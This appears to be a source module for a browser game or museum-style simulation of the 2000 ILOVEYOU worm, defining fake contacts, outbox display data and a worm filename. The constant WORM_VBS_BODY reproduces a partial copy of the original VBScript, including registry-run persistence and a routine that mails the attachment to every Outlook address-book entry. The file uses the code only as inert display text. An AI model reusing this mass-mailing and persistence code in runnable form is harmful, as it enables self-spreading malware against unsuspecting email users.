// Shared constants for the ILOVEYOU worm simulation. Everything here is inert
// browser theatre: the "worm" only rewrites the virtual filesystem and flips a
// display flag. It never touches the real machine, and BIOS Setup > Restore
// System (Factory Reset) fully reverses it.

// The name the shell shows in place of every real label once "infected". This is
// the exact filename the historical worm arrived as (a hidden .vbs behind a fake
// .TXT extension).
export const WORM_DISPLAY_NAME = 'LOVE-LETTER-FOR-YOU.TXT.vbs'

// The disk path the fake attachment is seeded at.
export const WORM_FILE_PATH = 'C:\\My Documents\\LOVE-LETTER-FOR-YOU.TXT.vbs'

// Fake "address book" the Outbox theatre uses (see wormOutboxItems below). Every
// address is under a domain RFC 2606 reserves for examples (example.com / .net /
// .org), so none can ever belong to a real person. These are display strings
// only: the app has no email capability and sends nothing anywhere.
export const WORM_OUTBOX_CONTACTS: ReadonlyArray<{ name: string; addr: string }> = [
  { name: 'Mom', addr: 'mom@example.com' },
  { name: 'Dad', addr: 'dad@example.com' },
  { name: 'Boss', addr: 'boss@example.net' },
  { name: 'Best Friend', addr: 'best.friend@example.org' },
  { name: 'Aunt Linda', addr: 'aunt.linda@example.com' },
  { name: 'Study Group', addr: 'study.group@example.net' },
  { name: 'Book Club', addr: 'book.club@example.org' },
  { name: 'Coworker', addr: 'coworker@example.net' },
  { name: 'Old Roommate', addr: 'old.roommate@example.com' },
  { name: 'Cousin Ray', addr: 'cousin.ray@example.org' },
  { name: 'Team Lead', addr: 'team.lead@example.net' },
  { name: 'Neighbor', addr: 'neighbor@example.com' },
  { name: 'Professor', addr: 'professor@example.org' },
  { name: 'Gym Buddy', addr: 'gym.buddy@example.net' },
  { name: 'Landlord', addr: 'landlord@example.com' },
  { name: 'Uncle Pete', addr: 'uncle.pete@example.org' },
  { name: 'Church Group', addr: 'church.group@example.net' },
  { name: 'Grandma', addr: 'grandma@example.com' },
  { name: 'Ex Roomie', addr: 'ex.roomie@example.org' },
  { name: 'Soccer Team', addr: 'soccer.team@example.net' },
  { name: 'Sister', addr: 'sister@example.com' },
  { name: 'Brother', addr: 'brother@example.com' },
  { name: 'Dentist', addr: 'dentist@example.net' },
  { name: 'Travel Agent', addr: 'travel.agent@example.org' },
]

/** The historical worm mailed itself to everyone in the address book. This builds
 *  the copies the infected Outbox *appears* to be flushing, one per fake contact
 *  above. It is pure display data derived from a flag: no message is created,
 *  queued for real delivery, or sent. Fully reverted by the BIOS factory reset. */
export function wormOutboxItems<T>(make: (contact: { name: string; addr: string }, index: number) => T): T[] {
  return WORM_OUTBOX_CONTACTS.map(make)
}

// The body the worm writes over every file's contents. A faithful replica of the
// real 2000 VBScript header and functions.
export const WORM_VBS_BODY = [
  'rem barok -loveletter(vbe) <i hate go to school>',
  'rem by: spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila, Philippines',
  'On Error Resume Next',
  'dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow',
  'eq="" : ctr=0',
  'set fso = CreateObject("Scripting.FileSystemObject")',
  'set file = fso.OpenTextFile(WScript.ScriptFullName, 1)',
  'vbscopy = file.ReadAll',
  'main()',
  '',
  'sub main()',
  '  On Error Resume Next',
  '  dim wscr',
  '  set wscr = CreateObject("WScript.Shell")',
  '  set dirwin = fso.GetSpecialFolder(0)',
  '  set dirsystem = fso.GetSpecialFolder(1)',
  '  set dirtemp = fso.GetSpecialFolder(2)',
  '  wscr.RegWrite "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSKernel32", dirsystem & "\\MSKernel32.vbs"',
  '  wscr.RegWrite "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\Win32DLL", dirwin & "\\Win32DLL.vbs"',
  '  spreadtoemail()',
  '  infectfiles(dirwin)',
  '  infectfiles(dirsystem)',
  '  infectfiles("C:\\My Documents")',
  'end sub',
  '',
  'sub spreadtoemail()',
  '  On Error Resume Next',
  '  dim x, a, male, out, mapi',
  '  set out = CreateObject("Outlook.Application")',
  '  set mapi = out.GetNameSpace("MAPI")',
  '  for ctrlists = 1 to mapi.AddressLists.Count',
  '    set a = mapi.AddressLists(ctrlists)',
  '    for x = 1 to a.AddressEntries.Count',
  '      set male = out.CreateItem(0)',
  '      male.Recipients.Add(a.AddressEntries(x))',
  '      male.Subject = "ILOVEYOU"',
  '      male.Body = "kindly check the attached LOVELETTER coming from me."',
  '      male.Attachments.Add(dirsystem & "\\LOVE-LETTER-FOR-YOU.TXT.vbs")',
  '      male.Send',
  '    next',
  '  next',
  'end sub',
].join('\n')
